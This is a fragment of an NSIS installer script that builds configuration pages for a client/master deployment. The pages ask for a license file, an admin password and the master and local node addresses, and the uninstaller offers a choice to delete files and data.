;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function FuncLicense
   ${If} $installUPGRADE == ${BST_CHECKED}
   ${AndIf} $installMaster != ${BST_CHECKED}
    Abort
   ${EndIf}
   ${If} $installMaster != ${BST_CHECKED} 
   ${AndIf} $installDISTRIBUTED == ${BST_CHECKED}
     Abort
   ${EndIf}
  
   !insertmacro MUI_HEADER_TEXT "Configuration settings: License" "Please enter configuration settings."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateLabel} 0 5u 100% 10u "License file:"
   ${NSD_CreateLabel} 5u 22u 40u 10u "License:"
   ${NSD_CreateFileRequest} 50u 20u 145u 12u ""
   Pop $1
   ${NSD_CreateBrowseButton} 200u 20u 50u 12u "Browse..."
   Pop $0
   GetFunctionAddress $2 BrowseClickFunction
   nsDialogs::OnClick /NOUNLOAD $0 $2

   ${NSD_SetFocus} $1
   nsDialogs::Show
FunctionEnd

Function FuncLicenseLeave
   ${NSD_GetText} $1 $masterLicense

   StrCmp $masterLicense "" 0 +3
      MessageBox MB_OK|MB_ICONSTOP "License file cannot be empty"
      Abort

   IfFileExists $masterLicense +3 0
      MessageBox MB_OK|MB_ICONSTOP "Cannot read license file"
      Abort
FunctionEnd

Function BrowseClickFunction
   nsDialogs::SelectFileDialog /NOUNLOAD open "" "License files (*.lic)|*.lic"
   Pop $0

   SendMessage $1 ${WM_SETTEXT} 0 STR:$0
FunctionEnd

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function FuncInsertCredentials
   ${If} $installUPGRADE == ${BST_CHECKED}
    Abort
   ${EndIf}
  !insertmacro MUI_HEADER_TEXT "Configuration settings: Admin account" "Please enter configuration settings."

  nsDialogs::Create /NOUNLOAD 1018

  ${NSD_CreateLabel} 0 5u 100% 10u "Account for the 'admin' user:"
  ${NSD_CreateLabel} 5u 22u 40u 10u "Password:"
  ${NSD_CreatePassword} 50u 20u 200u 12u ""
  Pop $1

  ${NSD_SetFocus} $1
  
  nsDialogs::Show
FunctionEnd

Function FuncInsertCredentialsLeave
  ${NSD_GetText} $1 $adminpass

  StrCmp $adminpass "" 0 +3
    MessageBox MB_OK|MB_ICONSTOP "Password for user 'admin' cannot be empty"
    Abort
FunctionEnd



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function FuncInsertAddress
   ${If} $installUPGRADE == ${BST_CHECKED}
    Abort
   ${EndIf}
  ${If} $installALLINONE == ${BST_CHECKED} 
  ${OrIf} $installMaster == ${BST_CHECKED}
    StrCpy $masterAddress $masterCN
    Abort
  ${EndIf}
    
  !insertmacro MUI_HEADER_TEXT "Configuration settings" "Please enter configuration settings."

  nsDialogs::Create /NOUNLOAD 1018

  ${NSD_CreateLabel} 0 40u 100% 10u "Address of the Master Node:"
  ${NSD_CreateLabel} 5u 57u 55u 10u "Common Name:"
  ${NSD_CreateText} 70u 55u 200u 12u ""
  Pop $1

  ${NSD_CreateLabel} 0 75u 100% 10u "Address of this machine:"
  ${NSD_CreateLabel} 5u 92u 55u 10u "Common Name:"
  ${NSD_CreateText} 70u 90u 200u 12u ""
  Pop $2

  ${NSD_SetFocus} $1
  
  nsDialogs::Show
FunctionEnd

Function FuncInsertAddressLeave
  ${NSD_GetText} $1 $masterAddress
	${NSD_GetText} $2 $localAddress

  StrCmp $masterAddress "" 0 +3
    MessageBox MB_OK|MB_ICONSTOP "Address for Master Node cannot be empty"
    Abort
FunctionEnd

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Function un.FuncDeleteFiles

   !insertmacro MUI_HEADER_TEXT "Uninstalling" "Delete files and data."

   nsDialogs::Create /NOUNLOAD 1018

   ${NSD_CreateCheckBox} 20u 5u 200u 12u "Delete all files and data"
   Pop $deletefilesctrl

   ${NSD_Check} $deletefilesctrl

   ${NSD_SetFocus} $deletefilesctrl
   nsDialogs::Show

   Return

FunctionEnd

Function un.FuncDeleteFilesLeave

   ${NSD_GetState} $deletefilesctrl $deletefiles

   Return

FunctionEnd